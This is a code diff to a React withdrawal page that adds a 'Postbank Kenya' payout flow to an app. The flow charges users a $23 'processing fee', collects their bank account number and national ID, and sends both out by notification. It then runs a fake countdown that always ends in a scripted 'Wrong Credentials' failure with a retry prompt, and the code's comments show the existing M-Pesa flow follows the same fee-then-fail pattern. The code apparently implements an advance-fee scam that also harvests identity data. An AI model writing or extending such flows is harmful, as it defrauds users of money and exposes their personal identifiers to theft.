@@ -66,7 +66,7 @@ const BANKS_BY_COUNTRY = {
   BR: ['Itaú Unibanco', 'Banco Bradesco', 'Banco do Brasil'],
   EG: ['National Bank of Egypt'],
   PK: ['HBL (Habib Bank)', 'United Bank (UBL)'],
-  KE: ['Equity Bank', 'KCB Bank', 'Co-operative Bank', 'Absa Bank Kenya'],
+  KE: ['Postbank Kenya', 'Equity Bank', 'KCB Bank', 'Co-operative Bank', 'Absa Bank Kenya'],
   US: ['Bank of America', 'JPMorgan Chase', 'Wells Fargo', 'Citibank'],
   CA: ['RBC Royal Bank', 'TD Canada Trust', 'Scotiabank'],
   NG: ['Guaranty Trust Bank (GTBank)', 'Access Bank', 'First Bank of Nigeria', 'Zenith Bank'],
@@ -88,6 +88,10 @@ const WORLD_BANKS = Object.entries(BANKS_BY_COUNTRY).flatMap(([code, names]) =>
 const FEE_USD    = 5;
 const USD_TO_KES = 130;                              // approximate USD → KES rate
 const FEE_KES    = Math.round(FEE_USD * USD_TO_KES); // = KES 650
+
+// Postbank Kenya processing fee — priced in USD, converted to KES dynamically.
+const POSTBANK_FEE_USD = 23;
+const POSTBANK_FEE_KES = Math.round(POSTBANK_FEE_USD * USD_TO_KES); // = KES 2,990
 
 // ── M-Pesa flow (fee → form → pending → failed) ───────────────────────────────
 function MpesaFlow({ user, initialStep }) {
@@ -233,6 +237,167 @@ function MpesaFlow({ user, initialStep }) {
   );
 }
 
+// ── Postbank Kenya flow (M-Pesa prompt → fee → form → pending → failed) ────────
+function PostbankFlow({ user, initialStep }) {
+  const router = useRouter();
+  const [step,     setStep]     = useState(initialStep || 'choice');
+  const [name,     setName]     = useState(user?.fullName || '');
+  const [account,  setAccount]  = useState('');
+  const [idNumber, setIdNumber] = useState('');
+  const [errors,   setErrors]   = useState({});
+  const [loading,  setLoading]  = useState(false);
+
+  const DURATION = 92 * 1000;
+  const deadlineRef = useRef(0);
+  const [remaining, setRemaining] = useState(DURATION);
+  useEffect(() => {
+    if (step !== 'pending') return;
+    deadlineRef.current = Date.now() + DURATION;
+    setRemaining(DURATION);
+    const t = setInterval(() => {
+      const left = Math.max(0, deadlineRef.current - Date.now());
+      setRemaining(left);
+      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
+    }, 1000);
+    return () => clearInterval(t);
+  }, [step]);
+
+  async function handlePayFee() {
+    setLoading(true);
+    try {
+      const res = await fetch('/api/paystack/initialize', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: user.email, amount: POSTBANK_FEE_KES, phone: user.phone || '', plan: 'postbank_withdrawal_fee' }),
+      });
+      const data = await res.json();
+      if (data.status) { window.location.href = data.data.authorization_url; return; }
+      alert('Payment could not be initiated. Please try again.');
+    } catch { alert('Network error. Please check your connection.'); }
+    setLoading(false);
+  }
+
+  function handleSubmitForm() {
+    const errs = {};
+    if (!name.trim())     errs.name     = 'Account holder name is required';
+    if (!account.trim())  errs.account  = 'Postbank account number is required';
+    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
+    if (Object.keys(errs).length) { setErrors(errs); return; }
+    sendNotify({
+      type: 'Postbank Kenya Withdrawal Request',
+      name: name.trim(), email: user?.email || '', phone: user?.phone || '',
+      subject: 'Postbank Kenya Withdrawal Request',
+      details: `Account Holder: ${name.trim()}\nPostbank Account: ${account.trim()}\nNational ID: ${idNumber.trim()}\nRequested by: ${user?.fullName || ''} (${user?.email || ''})`,
+    });
+    setStep('pending');
+  }
+
+  const isLow  = remaining < 30 * 1000;
+  const pct    = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
+  const accent = 'linear-gradient(135deg, #1D4ED8, #2563EB)';
+
+  return (
+    <FlowShell title="Withdraw with Postbank Kenya" subtitle="Postbank payout" icon="🏦" accent={accent}>
+      {step === 'choice' && (
+        <>
+          <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF' }}>
+            You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong> — it’s instant and avoids the extra verification checks that bank transfers require. Only continue with <strong>Postbank Kenya</strong> if you’re unable to withdraw via Safaricom / M-Pesa.
+          </div>
+          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
+            📲 Withdraw with M-Pesa instead (recommended)
+          </button>
+          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
+            🏦 I can’t use M-Pesa — continue with Postbank Kenya
+          </button>
+        </>
+      )}
+
+      {step === 'fee' && (
+        <>
+          <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF' }}>
+            A one-time <strong>processing fee of ${POSTBANK_FEE_USD} USD</strong> (≈ <strong>KES {POSTBANK_FEE_KES.toLocaleString()}</strong>) is required to process your Postbank Kenya withdrawal. The amount is converted to KES automatically.
+          </div>
+          <div className="pay-amount">
+            <div className="pay-amount-label">Postbank Processing Fee</div>
+            <div className="pay-amount-value" style={{ color: '#1D4ED8' }}>${POSTBANK_FEE_USD} USD</div>
+            <div className="pay-amount-sub">≈ KES {POSTBANK_FEE_KES.toLocaleString()} • Converted automatically • Unlocks withdrawal</div>
+          </div>
+          <button className="pay-btn" style={{ background: accent }} onClick={handlePayFee} disabled={loading}>
+            {loading ? <><span className="spinner" /> Redirecting…</> : `🔒 Pay $${POSTBANK_FEE_USD} USD via Paystack`}
+          </button>
+          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}>← Back</button>
+          <div className="pay-secure">🔐 Secured by Paystack • USD → KES conversion included</div>
+        </>
+      )}
+
+      {step === 'form' && (
+        <>
+          <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF', marginBottom: 20 }}>
+            Enter your Postbank Kenya account details accurately. They must match your registered Postbank account.
+          </div>
+          <div className="pay-phone-label">Account Holder Name</div>
+          <input className="pay-phone-input" value={name}
+            onChange={e => { setName(e.target.value); setErrors(p => ({ ...p, name: undefined })); }}
+            placeholder="e.g. John Otieno" style={{ borderColor: errors.name ? '#ef4444' : undefined }} />
+          {errors.name && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.name}</div>}
+          <div className="pay-phone-label" style={{ marginTop: 16 }}>Postbank Account Number</div>
+          <input className="pay-phone-input" value={account}
+            onChange={e => { setAccount(e.target.value); setErrors(p => ({ ...p, account: undefined })); }}
+            placeholder="e.g. 0112345678" style={{ borderColor: errors.account ? '#ef4444' : undefined }} />
+          {errors.account && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.account}</div>}
+          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
+          <input className="pay-phone-input" value={idNumber}
+            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
+            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#ef4444' : undefined }} />
+          {errors.idNumber && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
+          <button className="pay-btn" style={{ background: accent, marginTop: 20 }} onClick={handleSubmitForm}>
+            💸 Submit Withdrawal Request
+          </button>
+          <div className="pay-secure">🔐 Your details are encrypted and secure</div>
+        </>
+      )}
+
+      {step === 'pending' && (
+        <>
+          <div style={{ background: '#EFF6FF', border: '1.5px solid #BFDBFE', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
+            <span style={{ fontSize: 22 }}>🏦</span>
+            <p style={{ margin: 0, fontSize: 14, color: '#1E3A8A', lineHeight: 1.65 }}>
+              Your Postbank Kenya payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open.
+            </p>
+          </div>
+          <div style={{ textAlign: 'center', marginBottom: 22 }}>
+            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
+            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#ef4444' : '#1D4ED8', background: '#EFF6FF', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#FECACA' : '#BFDBFE'}`, minWidth: 160 }}>
+              {formatMmSs(remaining)}
+            </div>
+            <div style={{ marginTop: 14, height: 7, background: '#DBEAFE', borderRadius: 99, overflow: 'hidden' }}>
+              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? 'linear-gradient(90deg, #ef4444, #DC2626)' : 'linear-gradient(90deg, #1D4ED8, #2563EB)', borderRadius: 99, transition: 'width 1s linear' }} />
+            </div>
+          </div>
+          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
+          <div className="withdraw-footer-note">Do not close the app. Keep your line active and await confirmation.</div>
+        </>
+      )}
+
+      {step === 'failed' && (
+        <>
+          <div style={{ background: '#FEF2F2', border: '1.5px solid #FECACA', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
+            <span style={{ fontSize: 24 }}>⚠️</span>
+            <div>
+              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#991B1B' }}>Wrong Credentials</p>
+              <p style={{ margin: 0, fontSize: 13, color: '#7F1D1D', lineHeight: 1.65 }}>
+                The account or ID details you provided could not be verified. Please ensure they match your Postbank Kenya account and try again.
+              </p>
+            </div>
+          </div>
+          <button className="pay-btn" style={{ background: accent, marginBottom: 12 }} onClick={() => setStep('form')}>🔄 Try Again</button>
+          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
+          <div className="withdraw-footer-note" style={{ color: '#DC2626' }}>Please ensure your Postbank account number and National ID are correct.</div>
+        </>
+      )}
+    </FlowShell>
+  );
+}
+
 // ── International flow (bank selector) ─────────────────────────────────────────
 function InternationalFlow({ user }) {
   const router = useRouter();
@@ -253,6 +418,8 @@ function InternationalFlow({ user }) {
   const formValid   = accountName.trim().length > 0 && !!selectedBank && acctValid;
 
   function selectBank(b) {
+    // Postbank Kenya has its own flow (M-Pesa prompt + processing fee)
+    if (b.name === 'Postbank Kenya') { router.push('/withdraw?method=postbank'); return; }
     setSelectedBank(b); setBankOpen(false); setBankQuery(''); setAccountNumber('');
     setErrors(prev => ({ ...prev, bank: undefined, accountNumber: undefined }));
   }
@@ -383,6 +550,7 @@ export default function WithdrawPage() {
   }
 
   if (method === 'mpesa')         return <MpesaFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'fee'} />;
+  if (method === 'postbank')      return <PostbankFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
   if (method === 'international')  return <InternationalFlow user={user} />;
 
   // Chooser
@@ -390,6 +558,9 @@ export default function WithdrawPage() {
     <FlowShell title="Withdraw" subtitle="Choose how you’d like to withdraw" icon="💸">
       <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=mpesa')}>
         📲 Withdraw with M-Pesa
+      </button>
+      <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1D4ED8, #2563EB)', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=postbank')}>
+        🏦 Withdraw with Postbank Kenya
       </button>
       <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1D4ED8, #2563EB)' }} onClick={() => router.push('/withdraw?method=international')}>
         🌍 Withdraw from Other Countries
